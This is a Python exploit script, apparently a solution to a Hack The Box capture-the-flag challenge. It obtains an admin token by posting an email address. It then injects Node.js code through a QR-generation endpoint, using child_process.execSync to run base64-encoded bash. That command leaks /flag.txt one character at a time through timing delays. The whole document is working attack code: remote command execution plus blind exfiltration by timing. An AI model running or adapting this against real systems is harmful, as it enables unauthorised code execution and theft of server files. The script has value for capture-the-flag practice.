#!/usr/bin/python3
import requests, json, string, base64
from time import time

alphabet = string.ascii_letters + string.digits + "!\"#$%&'()*+,-./:;<=>?@[]^_`{|}~"
flag = ""
server="94.237.62.195"
port=34204
url=f"http://{server}:{port}"
auth_endpoint=f"{url}/api/auth/authenticate"
qr_endpoint=f"{url}/api/service/generate"

#Getting the admin cookie
headers = {"Content-Type": "application/json"}
data = {"email": "yovecio@hackthebox.com"}
response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
token = response.json()['token']

#Getting the flag
for i in range(1, 50): 
    for char in alphabet:
        #Adjust the command you want to use...
        temp = 'cat /flag.txt | head -c %s | tail -c 1 | { read c; if [ "$c" = "%s" ]; then sleep 3; fi; }' %(i, char)
        #Converting to B64    
        temp_bytes = temp.encode("ascii")
        base64_bytes = base64.b64encode(temp_bytes) 
        base64_string = base64_bytes.decode("ascii")

        headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
        #Sending the payload(using B64 encoding do not have to deal with  quotes in JSON)
        payload ={"text": "'}) + require('child_process').execSync('echo " + base64_string + "| base64 -d | bash')//"} 

        #Starting the timer
        t0 = time()
        response = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))

        #If took more than 2 sec then timebased is true
        t1 = time() - t0
        if (t1 >= 3):
            flag += char
            print("The flag is: " + flag)
